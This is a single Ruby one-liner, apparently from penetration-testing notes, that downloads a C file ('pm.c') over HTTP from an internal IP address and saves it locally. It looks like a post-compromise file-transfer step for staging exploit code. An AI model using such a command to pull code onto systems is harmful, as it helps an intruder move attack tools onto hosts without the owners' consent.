ruby -e 'require "net/http"; Net::HTTP.start("10.11.0.172") { |http|; resp = http.get("/pm.c"); open("download_via_ruby", "wb") { |file|; file.write(resp.body); }; }'
